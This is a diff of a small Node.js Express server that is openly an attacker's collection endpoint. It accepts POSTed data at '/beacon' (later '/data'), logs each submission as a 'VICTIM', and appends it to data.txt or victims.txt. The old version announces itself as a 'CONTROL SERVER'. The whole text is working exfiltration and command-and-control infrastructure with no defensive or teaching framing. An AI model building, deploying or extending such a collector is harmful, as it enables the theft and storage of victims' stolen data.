@@ -1,11 +1,11 @@
-const express = require('express');
-const app = express();
-app.use(express.json({limit:'50mb'}));
+const express=require('express');
+const app=express();
+app.use(express.json());
 
-app.post('/beacon', (req,res)=>{ 
-  console.log('GOT VICTIM:', req.body);
-  require('fs').writeFileSync('data.txt', JSON.stringify(req.body)+'\n',{flag:'a'});
-  res.send('OK');
+app.post('/data',(r,rs)=>{
+  console.log('🎯 VICTIM:',r.body);
+  require('fs').appendFileSync('victims.txt',JSON.stringify(r.body)+'\n');
+  rs.send('ok');
 });
 
-app.listen(3000, ()=>console.log('CONTROL SERVER READY'));
+app.listen(3000);
